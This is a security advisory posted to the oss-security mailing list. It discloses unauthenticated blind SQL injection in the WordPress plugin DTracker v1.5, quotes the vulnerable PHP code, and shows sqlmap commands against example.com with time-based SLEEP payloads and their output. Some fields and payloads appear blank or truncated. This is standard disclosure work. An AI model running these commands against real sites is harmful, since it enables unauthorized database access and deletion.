  oss-security - Multiple Blind SQL injection vulnerability in Wordpress Plugin  DTracker v1.5            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 09 Mar From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Multiple Blind SQL injection vulnerability in Wordpress Plugin  DTracker v1.5  Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5 Author: Larry W. Cashdollar, @_larry0 Date: CVE-IDs: Download Site: https://wordpress.org/plugins/dtracker/ Vendor: https://profiles.wordpress.org/dijo/ Vendor Notified: Vendor Contact: plugins@...dpress.org Advisory: Description: Track the details of the users downloading the pdf files from wordpress site. Vulnerability: In file ./dtracker/download.php user input isn't sanitized via the id variable before adding it to the end of an SQL query.  $doc_id         = $_GET['id']; $file = $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID = $doc_id " );  The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.  In file ./dtracker/delete.php user input isn't sanitized via the contact_id variable before adding it to the end of an SQL query.  $contact_id     = $_POST['contact_id']; //Contact ID to be deleted  $query  = "DELETE FROM wp_contacts WHERE id = $contact_id"; $wpdb->query($query); // Delete the contact  The user does not need to be authenticated to the Wordpress installation to exploit this vulnerability.  Exploit Code: 	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/download.php?id=*'  --dbms mysql  --level 3 --risk 3 	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* (URI) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace 	•     Payload: WHEN THEN SLEEP(5) ELSE END) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [WARNING] HTTP error codes detected during run: 	• (Not Found) - 14 times 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 	   	• $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtracker/delete.php' --data 'contact_id=*'  --dbms mysql --risk 1 --level 3 	•   	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]  	• sqlmap identified the following injection point(s) with a total of HTTP(s) requests: 	• --- 	• Parameter: #1* ((custom) POST) 	•     Type: AND/OR time-based blind 	•     Title: MySQL >= time-based blind - Parameter replace (substraction) 	•     Payload: contact_id=(SELECT * FROM (SELECT(SLEEP(5)))Vtrh) 	• --- 	• [INFO] the back-end DBMS is MySQL 	• web server operating system: Linux Ubuntu (xenial) 	• web application technology: Apache 	• back-end DBMS: MySQL >= 	• [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      